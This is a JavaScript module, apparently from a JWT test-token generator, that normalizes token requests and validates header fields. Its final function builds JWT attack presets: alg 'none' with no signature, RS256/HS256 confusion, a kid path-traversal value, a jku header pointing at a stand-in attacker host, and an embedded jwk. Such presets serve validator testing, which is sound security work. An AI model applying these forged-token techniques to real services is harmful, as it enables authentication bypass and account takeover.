const STRUCTURED_REQUEST_FIELDS = ['header', 'body', 'signature'];
const SUPPORTED_HEADER_FIELDS = ['alg', 'typ', 'cty', 'kid', 'jku', 'jwk', 'crit'];
const UNSUPPORTED_HEADER_FIELDS = ['x5u', 'x5c', 'x5t'];
const METADATA_FIELDS = [
  'mode',
  'exclude',
  'malicious_category',
  'grammar_category',
  'kty',
  'response_type',
  'grant_type',
  'header_alg',
  'header_kid',
  'sig',
  'signature',
  'header',
  'body',
  'vulnerability',
  'alg_none_variant',
  'version'
];

export function isPlainObject(value) {
  return value !== null && typeof value === 'object' && !Array.isArray(value);
}

function hasOwn(object, key) {
  return Object.prototype.hasOwnProperty.call(object, key);
}

export function removeUndefinedFields(object) {
  return Object.fromEntries(
    Object.entries(object).filter(([, value]) => value !== undefined)
  );
}

export function buildJwtHeader(keyData, headerOverrides = {}) {
  return removeUndefinedFields({
    alg: keyData.alg,
    typ: 'JWT',
    kid: keyData.kid,
    ...headerOverrides
  });
}

function normalizeMode(mode) {
  if (mode === 'malcious') return 'malicious';
  if (mode === 'grammer') return 'grammar';
  return mode || 'fake';
}

function getOption(requestData, body, field, defaultValue = undefined) {
  if (hasOwn(requestData, field)) return requestData[field];
  if (body && hasOwn(body, field)) return body[field];
  return defaultValue;
}

function sanitizeClaims(requestData) {
  const claims = { ...requestData };
  METADATA_FIELDS.forEach(field => delete claims[field]);
  delete claims.alg;
  return removeUndefinedFields(claims);
}

function normalizeHeader(requestData, structured) {
  let header = {};

  if (structured) {
    if (requestData.header === undefined) {
      header = {};
    } else if (!isPlainObject(requestData.header)) {
      throw new Error('header must be an object');
    } else {
      header = { ...requestData.header };
    }
  }

  if (!structured || requestData.header_alg !== undefined) {
    header.alg = requestData.header_alg;
  }
  if (!structured || requestData.header_kid !== undefined) {
    header.kid = requestData.header_kid;
  }

  const unsupported = Object.keys(header).filter(field =>
    UNSUPPORTED_HEADER_FIELDS.includes(field)
  );
  if (unsupported.length > 0) {
    throw new Error(`Unsupported JWT header field(s): ${unsupported.join(', ')}`);
  }

  const criticalFields = header.crit;
  if (criticalFields !== undefined) {
    if (!Array.isArray(criticalFields) || !criticalFields.every(field => typeof field === 'string')) {
      throw new Error('crit must be an array of header parameter names');
    }

    const missingCriticalFields = criticalFields.filter(field => !hasOwn(header, field));
    if (missingCriticalFields.length > 0) {
      throw new Error(`Missing critical JWT header field(s): ${missingCriticalFields.join(', ')}`);
    }
  }

  const unknown = Object.keys(header).filter(field =>
    !SUPPORTED_HEADER_FIELDS.includes(field) &&
    !(Array.isArray(criticalFields) && criticalFields.includes(field))
  );
  if (unknown.length > 0) {
    throw new Error(`Unsupported JWT header field(s): ${unknown.join(', ')}`);
  }

  return removeUndefinedFields(header);
}

function normalizeSignature(requestData, structured) {
  const signature = structured && hasOwn(requestData, 'signature')
    ? requestData.signature
    : requestData.sig;

  if (signature === undefined || signature === true) {
    return undefined;
  }
  if (signature === false || typeof signature === 'string') {
    return signature;
  }
  throw new Error('signature must be false, a string, or omitted');
}

/**
 * Normalize legacy flat JSON and structured JSON into one internal shape.
 * Structured JSON is auto-detected when header, body, or signature is present.
 */
export function normalizeTokenRequest(requestData = {}) {
  if (!isPlainObject(requestData)) {
    throw new Error('JSON request body must be an object');
  }

  const structured = STRUCTURED_REQUEST_FIELDS.some(field => hasOwn(requestData, field));
  let optionBody;
  let body;

  if (structured) {
    if (requestData.body === undefined) {
      body = {};
      optionBody = {};
    } else if (!isPlainObject(requestData.body)) {
      throw new Error('body must be an object');
    } else {
      optionBody = { ...requestData.body };
      body = sanitizeClaims(requestData.body);
    }
  } else {
    body = sanitizeClaims(requestData);
    optionBody = body;
  }

  return {
    structured,
    options: {
      mode: normalizeMode(getOption(requestData, optionBody, 'mode', 'fake')),
      exclude: getOption(requestData, optionBody, 'exclude', []),
      maliciousCategory: getOption(requestData, optionBody, 'malicious_category', null),
      grammarCategory: getOption(requestData, optionBody, 'grammar_category', null),
      responseType: getOption(requestData, optionBody, 'response_type', 'token'),
      kty: getOption(requestData, optionBody, 'kty', 'RSA'),
      vulnerability: getOption(requestData, optionBody, 'vulnerability', null),
      algNoneVariant: getOption(requestData, optionBody, 'alg_none_variant', undefined)
    },
    header: normalizeHeader(requestData, structured),
    body: removeUndefinedFields(body),
    signature: normalizeSignature(requestData, structured)
  };
}

export function parseResponseType(responseType = 'token') {
  const values = String(responseType)
    .toLowerCase()
    .trim()
    .split(/\s+/)
    .filter(Boolean);
  const uniqueValues = new Set(values.length > 0 ? values : ['token']);

  return {
    shouldGenerateAccessToken: uniqueValues.has('token'),
    shouldGenerateIdToken: uniqueValues.has('id_token')
  };
}

function resolveAlgNoneVariant(normalized) {
  const variant = normalized.options.algNoneVariant
    ?? (normalized.header.alg?.toLowerCase?.() === 'none' ? normalized.header.alg : 'none');
  if (typeof variant !== 'string' || variant.toLowerCase() !== 'none') {
    throw new Error('alg_none_variant must be a case variation of "none"');
  }
  return variant;
}

export function applyVulnerabilityPreset(normalized, keyData) {
  switch (normalized.options.vulnerability) {
    case null:
    case undefined:
      return normalized;
    case 'alg_none':
      normalized.header.alg = resolveAlgNoneVariant(normalized);
      if (normalized.signature === undefined) {
        normalized.signature = false;
      }
      return normalized;
    case 'rs_hs_confusion':
      normalized.header.alg = 'HS256';
      return normalized;
    case 'kid_traversal':
      if (normalized.header.kid === undefined) {
        normalized.header.kid = '../../../../../../dev/null';
      }
      return normalized;
    case 'jku_injection':
      if (normalized.header.jku === undefined) {
        normalized.header.jku = 'https://attacker.example.com/.well-known/jwks.json';
      }
      return normalized;
    case 'embedded_jwk':
      if (normalized.header.jwk === undefined) {
        normalized.header.jwk = keyData.publicKey;
      }
      return normalized;
    default:
      throw new Error(`Unsupported vulnerability mode: ${normalized.options.vulnerability}`);
  }
}
